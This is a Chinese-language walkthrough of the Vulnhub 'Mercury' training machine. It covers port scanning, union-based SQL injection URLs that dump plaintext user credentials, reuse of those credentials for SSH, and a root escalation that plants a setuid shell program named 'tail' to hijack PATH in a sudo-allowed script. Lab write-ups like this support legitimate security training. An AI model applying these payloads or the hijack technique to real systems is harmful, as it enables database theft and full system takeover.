
_这是一台标榜难度为简单的开源靶机。这台靶机有两个 flag。作者描述这台靶机最初设计是 VirtualBox 上的，所以使用 VMware 可能会有非预期的情况，在实际过程中，我重新编写了 Mercury 的网络配置文件 network。_

![des](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902094645924.png)


# 信息收集

1. 主机发现

目标的 IP 地址是 10.10.10.158。我们本地 kali 的地址是 10.10.10.117。

2. 端口扫描

```text
# Nmap 7.99 scan initiated Fri Aug 28 13:21:08 2026 as: /usr/lib/nmap/nmap --min-rate 10000 -p- -oA nmapscan/TCPS 10.10.10.158
Nmap scan report for 10.10.10.158
Host is up (0.00068s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 00:0C:29:A4:CF:82 (VMware)

# Nmap done at Fri Aug 28 13:21:10 2026 -- 1 IP address (1 host up) scanned in 1.91 seconds

# Nmap 7.99 scan initiated Fri Aug 28 13:30:35 2026 as: /usr/lib/nmap/nmap -sU --top-ports 100 -oA nmapscan/UDPS --reason 10.10.10.158
Nmap scan report for 10.10.10.158
Host is up, received arp-response (0.00096s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE REASON
68/udp open|filtered dhcpc   no-response
MAC Address: 00:0C:29:A4:CF:82 (VMware)

# Nmap done at Fri Aug 28 13:32:24 2026 -- 1 IP address (1 host up) scanned in 108.57 seconds
```

可见目标开放了 22 和 8080 两个端口。

```text
# Nmap 7.99 scan initiated Fri Aug 28 13:29:43 2026 as: /usr/lib/nmap/nmap -sT -sC -sV -O -p22,8080 -oA nmapscan/details 10.10.10.158
Nmap scan report for 10.10.10.158
Host is up (0.00065s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http    WSGIServer 0.2 (Python 3.8.2)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 00:0C:29:A4:CF:82 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 28 13:29:52 2026 -- 1 IP address (1 host up) scanned in 9.31 seconds

```

通过默认脚本对目标进行详细信息扫描，发现 8080 端口运行的是一个 WEB 服务，使用 python 语言运行的。目标的 linux 内核是 4.X 的版本。

3. 漏洞脚本扫描

```text
# Nmap 7.99 scan initiated Fri Aug 28 13:58:41 2026 as: /usr/lib/nmap/nmap --script=vuln -oA nmapscan/vulns 10.10.10.158
Nmap scan report for 10.10.10.158
Host is up (0.000080s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:A4:CF:82 (VMware)

# Nmap done at Fri Aug 28 14:07:23 2026 -- 1 IP address (1 host up) scanned in 521.73 seconds
```

脚本结果显示没有可以直接获得立足点的结果。

# WEB 渗透

登录 8080 端口，页面信息提示我们这是一个还处于开发中的网站。这说明网站还不是很完善，很可能存在一些未被发现的漏洞。

![p1](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902100327493.png)
随便输入一个网址，发现页面的报错信息非常详细。看来网站确实处于开发中，直接将可以访问的路由地址信息展示给我们了。我对这个 mercuryfacts 文件夹非常感兴趣。

![p2](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902100538841.png)


## SQL 注入发现网站开发账号密码

在翻看网站目录时候，发现有个 todo 的文件。发现一些我们感兴趣的信息。其中有一条，使用 django 的模型而不是直接调用数据库 mysql。我们意识到很可能当前网站存在数据库注入漏洞。

![p3](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902100944706.png)

通过翻找，最终发现了路径中的数字型注入漏洞。

![p4](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902101328237.png)

![p5](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902101353365.png)

我输入4-1，页面返回的结果和我输入 3返回的结果一致。这是一个数字型 SQL 注入。

```sql
http://10.10.10.158:8080/mercuryfacts/-1%20union%20select%20version()/#/

http://10.10.10.158:8080/mercuryfacts/-1 union select group_concat(schema_name) from information_schema.schemata/#/

information_schema,mercury

http://10.10.10.158:8080/mercuryfacts/-1 union select group_concat(table_name) from information_schema.tables where table_schema='mercury'/#/

facts,users

http://10.10.10.158:8080/mercuryfacts/-1 union select group_concat(column_name) from information_schema.columns where table_name='users'/#/

id,password,username

http://10.10.10.158:8080/mercuryfacts/-1 union select concat(id,0x2D,username,0x2D,password) from users/#/

Fact id: -1 union select concat(id,0x2D,username,0x2D,password) from users. (('1-john-johnny1987',), ('2-laura-lovemykids111',), ('3-sam-lovemybeer111',), ('4-webmaster-mercuryisthesizeof0.056Earths',))
```

我们成功获得当前数据库名是 mercury。
![p6](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902101804108.png)

当前数据库有两个表，表名分别是 facts，users 。

![p7](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902101904978.png)

![p8](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902102024526.png)
我们成功活动了当前账户的明文密码。

![p9](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902102053890.png)

# 明文密码碰撞 ssh 获得立足点

通过之前发现用户密码，我们猜测很可能 ssh 也采用了相同的用户凭据。我们使用 hydra 指定我们生成的账号和密码，成功测试出开发人员的 ssh 凭据。我们登录 ssh。

![p10](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902102229698.png)

![p11](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902110920856.png)

经过目录枚举，发现了 user flag 的字符串。随即，我们发现了一个 notes.txt 文件，里面记录了一个新的用户凭据。

![p12](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902111024773.png)

我们发现另一个用户凭据 linuxmaster。

![p13](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902111239860.png)

经过简单的枚举，我们发现当前用户 linuxmaster 能够使用 root 权限设置脚本执行的环境。
同时 sudoers 中说明了当前用户能高权限执行的脚本文件，check_syslog.sh。同时，我们发现 命令的 tail 没有指定绝对路径，我们可以构造一个同名文件，进行二进制文件劫持，执行我们自己的权限提升程序。

![vuln](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902112213895.png)

![p14](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902111502992.png)

我们构造脚本
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

```

我们将这个 C 语言程序编译成 tail 。通过在运行时，设置环境变量 PATH ，我们成功劫持 check_syslog.sh 脚本的执行，执行我们的提权脚本，获得 root 权限。

![p15](../vulnhubScreenShot/(纯)Vulnhub%20Mercury%20靶机渗透总结/IMG-20260902111901772.png)

# 总结

整体上，这台靶机偏简单，攻击链路非常清晰。